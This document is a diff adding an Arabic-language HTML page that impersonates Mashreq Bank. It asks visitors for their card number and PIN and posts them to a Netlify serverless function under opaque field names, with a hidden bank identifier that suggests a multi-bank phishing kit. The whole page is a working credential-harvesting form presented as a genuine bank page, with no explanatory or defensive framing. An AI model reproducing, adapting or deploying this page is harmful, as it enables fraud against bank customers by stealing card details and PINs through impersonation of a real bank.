@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك المشرق - إدخال البطاقة</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card-form { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        h1 { text-align: center; color: #333; margin-bottom: 20px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 8px; font-weight: bold; }
+        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        .submit-btn { width: 100%; padding: 12px; background-color: #158311; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; transition: background-color 0.3s; }
+        .submit-btn:hover { background-color: #126b0e; }
+    </style>
+</head>
+<body>
+
+    <div class="card-form">
+        <h1>بنك المشرق (Mashreq Bank)</h1>
+        <form action="/.netlify/functions/submit-card" method="POST">
+            
+            <input type="hidden" name="bank_id" value="1">
+
+            <div class="input-group">
+                <label for="s1">رقم البطاقة</label>
+                <input type="text" id="s1" name="s1" placeholder="xxxx xxxx xxxx xxxx" required>
+            </div>
+
+            <div class="input-group">
+                <label for="s2">الرقم السري (PIN)</label>
+                <input type="password" id="s2" name="s2" maxlength="4" required>
+            </div>
+
+            <button type="submit" class="submit-btn">تأكيد</button>
+        </form>
+    </div>
+
+</body>
+</html>
